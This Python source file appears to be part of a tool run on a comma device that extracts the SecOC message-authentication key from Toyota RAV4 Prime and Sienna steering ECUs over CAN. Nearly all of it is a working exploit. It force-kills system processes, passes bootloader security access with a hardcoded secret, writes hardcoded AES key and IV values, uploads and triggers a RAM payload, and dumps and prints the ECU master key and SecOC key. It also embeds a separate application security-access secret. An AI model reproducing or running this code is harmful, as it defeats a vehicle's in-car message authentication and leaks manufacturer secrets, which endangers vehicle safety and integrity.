#!/usr/bin/env python3
import struct
import subprocess
import time

from tsk.lib.diagnostic_route import (
  AmbiguousDiagnosticRouteError, DEFAULT_BUS_ORDER, discover_eps_route_with_routing, route_fields,
)
from tsk.lib.env import is_agnos, PAYLOAD_PATH
from tsk.lib.programming import ProgrammingHandoffError, enter_programming_bootloader, uds_client as make_uds_client
from tsk.lib.bootstrap_profile import (
  BOOT_SA_SECRET as SHARED_BOOT_SA_SECRET, BootstrapProfileError,
  DID_0201_DEFAULT, DID_0202_DEFAULT, RAM_DUMP_FIXTURE_SHA256, require_evidenced_fixture,
)
from tsk.lib.ram_exec_geometry import (
  COMMITTED_PAYLOAD_CONTRACT,
  RamExecGeometryError,
  build_request_download_data,
  build_verify_routine_data,
  resolve_ram_exec_geometry,
  transfer_chunks,
)


class NotAGNOSError(Exception):
  def __str__(self) -> str:
    return "Can't run TSK Extractor outside of a comma device."


class BoarddNotRunningError(Exception):
  pass


class RetryError(Exception):
  def __init__(self, message: str):
    self.message: str = message

  def __str__(self) -> str:
    return f"{self.message}\n\nTry again. If the problem persists, turn off the car, put it back into 'Not Ready to Drive' mode, and then try again."


class PandaError(Exception):
  pass


def format_version_for_error_display(version1, version2=None, length=8):
  version_str = ""

  version1_str = str(version1)
  if version1_str.startswith("b'"):
    version1_str = version1_str[2:]

  version_str = version1_str[:length]

  if version2 and version1 != version2:
    version2_str = str(version2)
    if version2_str.startswith("b'"):
      version2_str = version2_str[2:]

    version_str += ", " + version2_str[:length]

  return version_str


class TSKExtractor:
  ADDR = 0x7a1
  DEBUG = False
  CANDIDATE_BUSES = DEFAULT_BUS_ORDER

  # Distinct security domains. The bootloader uses 01/02; the analyzed Sienna
  # application uses 03/04 with an independent secret.
  BOOT_SA_SECRET = SHARED_BOOT_SA_SECRET
  APPLICATION_03_04_SA_SECRET_8965B4512000 = bytes.fromhex("893e08418c741ffa2a9c044bffa55813")

  # These are the key and IV used to encrypt the payload in build_payload.py
  DID_201_KEY = DID_0201_DEFAULT
  DID_202_IV = DID_0202_DEFAULT

  # Confirmed working on the following versions
  APPLICATION_VERSIONS = {
    b'\x018965B4209000\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 RAV4 Prime
    b'\x018965B4233100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2023 RAV4 Prime
    b'\x018965B4509100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 Sienna
  }

  KEY_STRUCT_SIZE = 0x20
  CHECKSUM_OFFSET = 0x1d
  SECOC_KEY_SIZE = 0x10
  SECOC_KEY_OFFSET = 0x0c

  _panda = None
  _last_extraction_metadata: dict = {}

  @classmethod
  def _connect_panda(cls):
    """Connect to the panda. The manager's pandad has already flashed the firmware.
    Stash the handle so the caller can close it after the operation (_close_panda)."""
    from panda import Panda

    panda_serials = Panda.list()
    if not panda_serials:
      raise PandaError("No panda found")

    cls._panda = Panda(panda_serials[0])
    return cls._panda

  @classmethod
  def _close_panda(cls) -> None:
    """Close and forget the stashed panda handle, if any. Idempotent. Called from the
    server's finally blocks so extract/dump/collect release the USB handle rather than
    leaking it until GC. Safe because the panda mutex serializes the three operations."""
    panda = cls._panda
    cls._panda = None
    if panda is not None:
      try:
        panda.close()
      except Exception:
        pass

  @classmethod
  def _get_key_struct(cls, data, key_no):
    return data[key_no * cls.KEY_STRUCT_SIZE: (key_no + 1) * cls.KEY_STRUCT_SIZE]

  @classmethod
  def _verify_checksum(cls, key_struct):
    checksum = sum(key_struct[:cls.CHECKSUM_OFFSET])
    checksum = ~checksum & 0xff
    return checksum == key_struct[cls.CHECKSUM_OFFSET]

  @classmethod
  def _get_secoc_key(cls, key_struct):
    return key_struct[cls.SECOC_KEY_OFFSET:cls.SECOC_KEY_OFFSET + cls.SECOC_KEY_SIZE]

  @classmethod
  def hack(cls):
    """Extracts the SecOC key from the EPS ECU via UDS over CAN."""
    if not is_agnos():
      raise NotAGNOSError

    from Crypto.Cipher import AES
    from tqdm import tqdm

    from opendbc.car.isotp import isotp_send
    from opendbc.car.uds import ACCESS_TYPE, SESSION_TYPE, DATA_IDENTIFIER_TYPE, SERVICE_TYPE, \
      ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError

    # Kill the manager so it doesn't restart pandad during extraction.
    # SIGKILL skips manager_cleanup(), keeping tskweb alive as an orphan.
    # User must reboot after extraction.
    subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
    subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
    time.sleep(2)

    panda = cls._connect_panda()
    try:
      route = discover_eps_route_with_routing(
        panda, cls.CANDIDATE_BUSES, preferred_tx=cls.ADDR, addresses=[cls.ADDR],
        preferred_timeout=0.4, scan_timeout=0.1,
      )
    except AmbiguousDiagnosticRouteError as e:
      raise RetryError(f"Ambiguous EPS diagnostic route: {e}") from e
    if route is None:
      raise RetryError("Car not detected on the normal-harness or OBD diagnostic routes")
    if route["tx"] != cls.ADDR or route["rx"] != cls.ADDR + 8 or route["tx_bus"] != route["rx_bus"]:
      raise RetryError(
        "Diagnostic responder does not match the Sienna payload route " +
        f"({route_fields(route)}); refusing to run the transfer payload"
      )

    active_bus = route["tx_bus"]
    cls._last_extraction_metadata = {"route": route_fields(route), "known_application": False}
    uds_client = make_uds_client(panda, route, timeout=0.3, response_pending_timeout=5.5)

    print("Getting application versions...")
    print(f" - route: {route_fields(route)}")

    try:
      app_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
      print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (application): {str(app_version)}")
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError("Car not detected") from e

    known_application = app_version in cls.APPLICATION_VERSIONS
    try:
      ram_geometry = resolve_ram_exec_geometry(bytes(app_version))
      COMMITTED_PAYLOAD_CONTRACT.validate_geometry(ram_geometry)
    except RamExecGeometryError as e:
      cls._last_extraction_metadata.update(
        application_version=bytes(app_version).hex(), known_application=known_application,
        ram_exec_geometry={"status": "unverified", "error": str(e)},
      )
      raise RetryError(
        "Refusing RAM extraction before PROGRAMMING: " +
        f"{e}. A diagnostic handoff or linker VMA is not authenticated RAM-exec evidence."
      ) from e

    cls._last_extraction_metadata.update(
      application_version=bytes(app_version).hex(), known_application=known_application,
      ram_exec_geometry={"status": "verified", **ram_geometry.public_dict()},
    )
    if not known_application:
      raise RetryError(
        "Authenticated RAM-exec geometry is known for this EPS, but the legacy RAM key-table " +
        "layout used by extractor.hack() is not verified for this exact F181. Use the " +
        "calibration-appropriate recovery path instead of projecting the older FEBE6E34 table."
      )
    try:
      bootstrap_evidence = require_evidenced_fixture(bytes(app_version), RAM_DUMP_FIXTURE_SHA256)
    except BootstrapProfileError as e:
      raise RetryError(
        "Refusing RAM extraction before PROGRAMMING: the boot geometry is compatible, but " +
        f"the exact payload fixture is not target-evidenced: {e}"
      ) from e
    cls._last_extraction_metadata["bootstrap"] = bootstrap_evidence.public_dict()

    # The first application 10 02 is asynchronous on the analyzed Sienna: it may emit
    # NRC 0x78 and reset before a final 50 02. Preserve the exact physical route and
    # require the endpoint to reappear there; the shared helper records Panda/CAN health.
    try:
      route, handoff = enter_programming_bootloader(
        panda, route, prepare_sessions=True, reappearance_timeout=6.0,
      )
    except ProgrammingHandoffError as e:
      cls._last_extraction_metadata["programming_handoff"] = e.telemetry
      if e.nrc is not None:
        raise RetryError(f"Programming session rejected with NRC 0x{e.nrc:02x}") from e
      raise RetryError(f"Programming handoff failed: {e}") from e

    active_bus = route["tx_bus"]
    cls._last_extraction_metadata.update(
      programming_handoff=handoff,
      route_after_programming=route_fields(route),
    )
    uds_client = make_uds_client(panda, route, timeout=0.3, response_pending_timeout=3.0)
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError("Bootloader reappeared but did not accept DEFAULT -> EXTENDED") from e

    # Get bootloader version
    try:
      bl_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError(f"Can't read bootloader version ({format_version_for_error_display(app_version)})") from e
    print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (bootloader) {str(bl_version)}")

    if bl_version != cls.APPLICATION_VERSIONS[app_version]:
      raise RetryError(
        "Bootloader identity differs from the field-supported fixture for this application; " +
        "refusing to reuse its authenticated payload contract."
      )

    # Go back to programming session
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError("Can't enter programming session for reading bootloader version") from e

    # Security Access - Request Seed
    try:
      seed_payload = b"\x00" * 16
      seed = uds_client.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)

      key = AES.new(cls.BOOT_SA_SECRET, AES.MODE_ECB).decrypt(seed_payload)
      key = AES.new(key, AES.MODE_ECB).encrypt(seed)

      print("\nSecurity Access...")

      print(" - SEED:", seed.hex())
      print(" - KEY:", key.hex())

      # Security Access - Send Key
      uds_client.security_access(ACCESS_TYPE.SEND_KEY, key)
      print(" - Key OK!")

    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError("Security Access failed") from e

    # Security Access - Send Key
    print("\nPreparing to upload payload...")

    try:
      # Firmware requires the bootloader WDBI sequence 0x0203 -> 0x0201 -> 0x0202
      # before RequestDownload. 0x0201/0x0202 feed the authenticated payload gate.
      uds_client.write_data_by_identifier(0x203, b"\x00" * 5)

      # Write KEY and IV to DID 201/202, prerequisite for request download.
      print(" - Write data by identifier 0x201", cls.DID_201_KEY.hex())
      uds_client.write_data_by_identifier(0x201, cls.DID_201_KEY)

      print(" - Write data by identifier 0x202", cls.DID_202_IV.hex())
      uds_client.write_data_by_identifier(0x202, cls.DID_202_IV)

      # RequestDownload, transferred length, 0x10F0 verification, and the payload's
      # embedded callback are one evidence-bound geometry contract.
      data = build_request_download_data(ram_geometry)

      print("\nUpload payload...")

      print(" - Request download")
      uds_client._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=data)

      payload = open(PAYLOAD_PATH, "rb").read()
      COMMITTED_PAYLOAD_CONTRACT.validate_geometry(ram_geometry)
      chunks = transfer_chunks(payload, ram_geometry)
      for i, chunk in enumerate(chunks, start=1):
        print(f" - Transfer data {i - 1}")
        uds_client.transfer_data(i, chunk)

      uds_client.request_transfer_exit()

      print("\nVerify payload...")
      data = build_verify_routine_data(ram_geometry)

      uds_client.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, data)
      print(" - Routine control 0x10f0 OK!")

    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
      raise RetryError("Payload upload failed") from e

    print("\nTrigger payload...")

    # Now we trigger the payload by trying to erase
    # [0] 0x31 (routine control)
    # [1] 0x01 (start)
    # [2] 0xff00 (routine identifier)
    # [4] 0x45 (format, 4 size bytes, 5 address bytes)
    # [5] 0x0
    # [6] mem addr
    # [10] mem addr
    data = b"\x45\x00"
    data += struct.pack('!I', 0xe0000)
    data += struct.pack('!I', 0x8000)

    # Manually send so we don't get stuck waiting for the response
    erase = b"\x31\x01\xff\x00" + data
    isotp_send(panda, erase, route["tx"], bus=active_bus)

    print("\nDumping keys...")
    start = 0xfebe6e34
    end = 0xfebe6ff4

    start_time = time.monotonic()
    timeout = 30

    extracted = b""

    with tqdm(total=end - start) as pbar:
      while start < end:

        current_time = time.monotonic()
        if current_time - start_time > timeout:
          raise RetryError("Key dumping timed out")

        for addr, *_, data, bus in panda.can_recv():
          if bus != active_bus:
            continue

          if data == b"\x03\x7f\x31\x78\x00\x00\x00\x00":  # Skip response pending
            continue

          if addr != cls.ADDR + 8:
            continue

          if cls.DEBUG:
            print(f"{data.hex()}")

          ptr = struct.unpack("<I", data[:4])[0]
          assert (ptr >> 8) == start & 0xffffff  # Check lower 24 bits of address

          extracted += data[4:]

          start += 4
          pbar.update(4)

          start_time = time.monotonic()

    key_1_ok = cls._verify_checksum(cls._get_key_struct(extracted, 1))
    key_4_ok = cls._verify_checksum(cls._get_key_struct(extracted, 4))

    if not key_1_ok or not key_4_ok:
      raise RetryError(f"SecOC key checksum verification failed ({format_version_for_error_display(app_version, bl_version)})")

    key_1 = cls._get_secoc_key(cls._get_key_struct(extracted, 1))
    key_4 = cls._get_secoc_key(cls._get_key_struct(extracted, 4))

    print("\nECU_MASTER_KEY   ", key_1.hex())
    print("SecOC Key (KEY_4)", key_4.hex())
    cls._last_extraction_metadata.update(
      ram_struct_checksums={"key_1": True, "key_4": True},
      candidate_key=key_4.hex(),
    )

    return key_4.hex()

  @classmethod
  def run(cls):
    try:
      secoc_key = cls.hack()
    except (BoarddNotRunningError, RetryError):
      raise
    except Exception as e:
      e.add_note("\n\n!!!! Unexpected error. Preserve the raw logs and export the evidence bundle before continuing.\n")
      raise

    print("SecOC key extracted successfully")
    print("!!!! Export the evidence bundle before continuing")
    return secoc_key
